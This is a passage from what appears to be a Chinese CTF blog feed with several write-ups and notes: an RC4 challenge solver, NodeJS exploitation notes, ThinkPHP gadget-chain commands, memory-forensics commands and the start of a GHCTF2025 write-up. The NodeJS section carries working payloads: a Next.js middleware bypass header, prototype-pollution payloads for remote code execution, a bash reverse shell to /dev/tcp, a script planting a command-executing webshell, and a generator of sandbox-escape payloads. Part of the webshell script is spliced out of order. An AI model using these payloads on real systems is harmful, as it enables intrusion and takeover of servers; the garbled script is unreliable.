class="literal">None</span>)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">    m = xor(m, MASK)</span><br><span class="line">    m = encryptor.update(m)</span><br><span class="line">    m = xor(m, MASK)</span><br><span class="line">    <span class="keyword">return</span> m.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="string">&quot;Welcome to my RC4 encryption service! Some may call it deprecated, I call it vintage.&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">input</span>(<span class="string">&quot;flag k: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(encrypt(k, FLAG.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    k = <span class="built_in">input</span>(<span class="string">&quot;k: &quot;</span>)</span><br><span class="line">    m = <span class="built_in">input</span>(<span class="string">&quot;m: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(encrypt(k, m))</span><br></pre></td></tr></table></figure><p>MASK 值在加密过程中被抵消了，实际是不存在的，题目就是标准 RC4。<br>那么用来加密全\x00 的字符串的话，就能得到 key。<br>ai 秒了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器</span></span><br><span class="line">conn = remote(<span class="string">&quot;crypto.heroctf.fr&quot;</span>, <span class="number">9001</span>)  <span class="comment"># 根据实际地址修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择任意密钥（十六进制字符串）</span></span><br><span class="line">key_hex = <span class="string">&quot;11223344556677889900aabbccddeeff&quot;</span>  <span class="comment"># 任意值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送密钥加密flag</span></span><br><span class="line">conn.recvuntil(<span class="string">b&quot;flag k: &quot;</span>)</span><br><span class="line">conn.sendline(key_hex.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收加密后的flag</span></span><br><span class="line">response = conn.recvline().decode().strip()</span><br><span class="line">encrypted_flag_hex = response</span><br><span class="line">encrypted_flag = <span class="built_in">bytes</span>.fromhex(encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加密的flag: <span class="subst">&#123;encrypted_flag_hex&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在本地用相同密钥生成RC4密钥流</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line">cipher = ARC4.new(key_bytes)</span><br><span class="line">keystream = cipher.encrypt(<span class="string">b&quot;\x00&quot;</span> * <span class="built_in">len</span>(encrypted_flag))  <span class="comment"># 加密全零得到密钥流</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密flag</span></span><br><span class="line">flag = xor(encrypted_flag, keystream)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试解码</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag_text = flag.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag_text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;包含非ASCII字符&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hex: <span class="subst">&#123;flag.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodeJS笔记自用</title>
      <link href="/posts/612758b9.html"/>
      <url>/posts/612758b9.html</url>
      
        <content type="html"><![CDATA[<h1 id="next-js-中间件绕过-cve-2025-29927">next_js 中间件绕过 cve-2025-29927</h1><p>请求头加上 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware<br>出现新的 Etag，替换一下给 If-None-Match，然后访问/dashboard 即可</p><h1 id="小知识">小知识</h1><p>connect.sid 类型的 Cookie，常见于使用 Express.js 搭配 express-session 中间件构建的 Node.js 应用</p><h1 id="原型链污染">原型链污染</h1><p>原型链污染, 过滤了 __proto__, 用 constructor.prototype 绕过<br>ejs 模板注入<br><a href="https://www.anquanke.com/post/id/236354">https://www.anquanke.com/post/id/236354</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><hr><p>用了 fork</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">payload = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;NODE_OPTIONS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--require /proc/self/environ&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                 <span class="attr">&quot;A&quot;</span><span class="punctuation">:</span><span class="string">&quot;require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&#x27;\&quot;)//&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"># 需要注意在 Payload 最后面有注释符 `<span class="comment">//`，这里的思路跟 SQL 注入很像</span></span><br></pre></td></tr></table></figure><p>不出网写 webshell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url:port&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 token</span></span><br><span class="line"><span class="comment"># 随便发送点图片获取 token</span></span><br><span class="line">files = [</span><br><span class="line">    (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;anno.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./1.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>)),</span><br><span class="line">    (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;soyo.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./2.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">res = requests.post(url + <span class="string">&quot;/upload&quot;</span>, files=files)</span><br><span class="line">token = res.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;token=([a-f0-9\-\.]+)&#x27;</span>, token)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    token = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;token=<span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过原型链污染 env 注入恶意代码即可 RCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 WebShell</span></span><br><span class="line">webshell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">const Koa = require(&#x27;koa&#x27;)</span></span><br><span class="line"><span class="string">const Router = require(&#x27;koa-router&#x27;)</span></span><br><span class="line"><span class="string">const app = new Koa()</span></span><br><span class="line"><span class="string">const router = new Router()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">router.get(&quot;/webshell&quot;, async (ctx) =&gt; &#123;</span></span><br><span class="line"><span class="string">    const &#123;cmd&#125; = ctx.query</span></span><br><span class="line"><span class="string">    res = require(&#x27;child_process&#x27;).execSync(cmd).toString()</span></span><br><span class="line"><span class="string">    return ctx.body = &#123;</span></span><br><span class="line"><span class="string">        res</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.use(router.routes())</span></span><br><span class="line"><span class="string">app.listen(3000, () =&gt; &#123;</span></span><br><span class="line"><span class="string">    console.log(&#x27;http://127.0.0.1:3000&#x27;)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 WebShell 内容 Base64 编码</span></span><br><span class="line">encoded_webshell = base64.b64encode(webshell.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码后写入文件</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;constructor&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;prototype&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require /proc/self/environ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;A&quot;</span>: <span class="string">f&quot;require(\&quot;child_process\&quot;).execSync(\&quot;echo <span class="subst">&#123;encoded_webshell&#125;</span> | base64 -d &gt; /app/index.js\&quot;)//&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原型链污染rocess&quot;, headers=headers)</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 访问有回显的 WebShell</span></span><br><span class="line">res = requests.get(url + <span class="string">&quot;/webshell?cmd=cat /flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line">next_js 中间件绕过 cve-<span class="number">2025</span>-<span class="number">29927</span></span><br><span class="line">小知识</span><br><span class="line"></span><br><span class="line">requests.post(url + <span class="string">&quot;/config&quot;</span>, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 fork 实现 RCE</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(url + <span class="string">&quot;/process&quot;</span>, headers=headers)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 访问有回显的 WebShell</span></span><br><span class="line">res = requests.get(url + <span class="string">&quot;/webshell?cmd=cat /flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h1 id="jsjail">jsjail</h1><h2 id="require-Common-JS-或-import-ES6">require(Common JS) 或 import(ES6)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于组装的loader</span></span><br><span class="line"></span><br><span class="line">list1 = [</span><br><span class="line">    <span class="string">&#x27;(1).constructor.constructor(&quot;return &#123;&#125;.toString();&quot;)();&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;true.constructor.constructor(&quot;return &#123;&#125;.toString();&quot;)();&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;1&quot;.constructor.constructor(&quot;return &#123;&#125;.toString();&quot;)();&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;setInterval(function()&#123;&#123;&#123;&#125;&#125;&#125;,1000);(慎用，循环执行)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;setTimeout(function()&#123;&#123;&#123;&#125;&#125;&#125;,1000);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Function(&#123;&#125;)();&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># commonjs和ES6的方法</span></span><br><span class="line">dict1 = &#123;</span><br><span class="line">    <span class="string">&quot;require&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;require(&#x27;child_process&#x27;).spawn(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;require(&#x27;child_process&#x27;).spawnSync(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;require(&#x27;child_process&#x27;).execFile(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;require(&#x27;child_process&#x27;).execFileSync(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;import&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;import(&#x27;child_process&#x27;).then(cp=&gt;&#123;&#123;cp.exec(&#x27;&#123;&#125;&#x27;);&#125;&#125;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;&#123;&#125;&#x27;)&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_for_sys</span>(<span class="params">command, module</span>):</span><br><span class="line">    flag = <span class="built_in">list</span>()</span><br><span class="line">    module = <span class="built_in">str</span>(module).lower()</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;commonjs&quot;</span>, <span class="string">&quot;es6&quot;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;module error only in Commonjs or ES6&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> module == <span class="string">&quot;commonjs&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> dict1[<span class="string">&quot;require&quot;</span>]:</span><br><span class="line">                p = i.<span class="built_in">format</span>(j.<span class="built_in">format</span>(command))</span><br><span class="line">                flag.append(p)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> dict1[<span class="string">&quot;import&quot;</span>]:</span><br><span class="line">                p = i.<span class="built_in">format</span>(j.<span class="built_in">format</span>(command))</span><br><span class="line">                flag.append(p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出payload</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="comment"># print(&quot;注意：nodejs版本&gt;=14,process.mainModule被弃用&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本描述以及读取shell传入的变量</span></span><br><span class="line">parser = argparse.ArgumentParser(</span><br><span class="line">    description=<span class="string">&quot;Description:This Program userd to generate Node.js Command execution payload&quot;</span></span><br><span class="line">)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--command&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;command eg:whoami&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(</span><br><span class="line">    <span class="string">&quot;--module&quot;</span>, <span class="string">&quot;-m&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;nodejs module eg:commonjs or ES6&quot;</span>, default=<span class="string">&quot;commonjs&quot;</span></span><br><span class="line">)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_for_sys(args.command, args.module)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h2 id="利用-process-binding-实现任意文件读取">利用 process.binding 实现任意文件读取</h2><p>当 ES6 的 js 文件使用了 eval 函数执行命令时，很不幸的事是：因为 import 不能和 require 共存，require 是用不了的，又因为 VM 的限制，在 await eval 里面不能使用 import，不然会报错。<br>一个测试：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> readline <span class="keyword">from</span> <span class="string">&quot;node:readline/promises&quot;</span>;</span><br><span class="line">using rl = readline.<span class="title function_">createInterface</span>(&#123; <span class="attr">input</span>: process.<span class="property">stdin</span>, <span class="attr">output</span>: process.<span class="property">stderr</span> &#125;);</span><br><span class="line"><span class="keyword">await</span> rl.<span class="title function_">question</span>(<span class="string">&#x27;eval&gt;&#x27;</span>).<span class="title function_">then</span>(<span class="built_in">eval</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br></pre></td></tr></table></figure><p>一旦调用了 import,会报错<br>这里想了一个方法：nodejs 提供了一个底层 api：process.binding。你可以用这里面的 api 实现像 C++代码一样的执行命令。<br>里面的库还挺多，我只研究了 fs 库。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bindingFs = process.<span class="title function_">binding</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bindingFs);</span><br></pre></td></tr></table></figure><p>会看到很多函数，这里主要关注 open,read 和 readdir</p><p>获取某个目录下的全部文件(如根目录)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">    <span class="string">`const bindingFs = process.binding(&quot;fs&quot;);const files = bindingFs.readdir(&quot;/&quot;, &quot;utf8&quot;, &#123;&#125;); if (Array.isArray(files)) &#123; console.log(&quot;成功! 文件列表:&quot;); files.forEach((file) =&gt; &#123; console.log(&quot; - &quot;, file); &#125;)&#125;`</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>读取任意文件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">`const bindingFs = process.binding(&quot;fs&quot;);console.log(bindingFs.read);const fd = bindingFs.open(&quot;flag.txt&quot;, 0, 0o666);const buffer = Buffer.alloc(1024);const bytesRead = bindingFs.read(fd, buffer, 0, buffer.length, 0);bindingFs.close(fd);console.log(buffer.slice(0, bytesRead).toString());</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp漏洞总结</title>
      <link href="/posts/992a85de.html"/>
      <url>/posts/992a85de.html</url>
      
        <content type="html"><![CDATA[<h1 id="5-0文件写入漏洞">5.0文件写入漏洞</h1><p><a href="https://www.anquanke.com/post/id/196364">https://www.anquanke.com/post/id/196364</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-2RCE漏洞">5.2RCE漏洞</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE1 <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="6-0RCE漏洞">6.0RCE漏洞</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE2 <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证</title>
      <link href="/posts/5090002e.html"/>
      <url>/posts/5090002e.html</url>
      
        <content type="html"><![CDATA[<p>因为2025年ciscn长城杯和ccsssc都考了很多内存取证题，都占到做题四分之三了。所以被迫开坑了。这是纯被逼的。。。</p><h1 id="Lovelymem使用">Lovelymem使用</h1><p>使用建议加群获取，虽然开源了，但是群里还是分享了取证工具如vol和gimp，免得一个个找了。<br>接下来的题目都是在边刷边记录，加油。</p><h2 id="PC’s-name-and-IP-address">PC’s name and IP address</h2><p><strong>PC’s name</strong><br>vol2</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f OtterCTF.vmem --profile=Win7SP1x64 printkey -K <span class="string">&quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span></span><br></pre></td></tr></table></figure><p><img src="image.png" alt="alt text"><br>Lovelymem<br>系统信息<br><img src="image-1.png" alt="alt text"><br>WIN-LO6FAF3DTFE<br><strong>IP address</strong><br>vol2</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><p>Lovelymem<br>网络信息<br><img src="image-2.png" alt="alt text"><br>192.168.202.131</p><h2 id="更新中。。">更新中。。</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHCTF2025个人题解WP</title>
      <link href="/posts/eaf5a65d.html"/>
      <url>/posts/eaf5a65d.html</url>
      
        <content type="html"><![CDATA[<p><img src="/img/WP/GHCTF2025/score.png" alt=""><br>冲鸭汲汲爆！！</p><h1 id="Web">Web</h1><h2 id="upload-SSTI">upload?SSTI!</h2><p>源码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置信息</span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/uploads&#x27;</span>  <span class="comment"># 上传文件保存目录</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;text&#x27;</span>,<span class="string">&#x27;md&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">MAX_CONTENT_LENGTH = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 限制上传大小为 16MB</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建上传目录（如果不存在）</span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">basedir, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.commonpath([basedir,path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_dangerous_keywords</span>(<span class="params">file_path</span>):</span><br><span class="line">    dangerous_keywords = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = <span class="built_in">str</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> file_content:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 找到危险关键字，返回 True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 文件内容中没有危险关键字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 检查是否有文件被上传</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;未上传文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否选择了文件</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;请选择文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证文件名和扩展名</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># 安全处理文件名</span></span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># 保存文件</span></span><br><span class="line">            save_path = os.path.join(app.config[<span 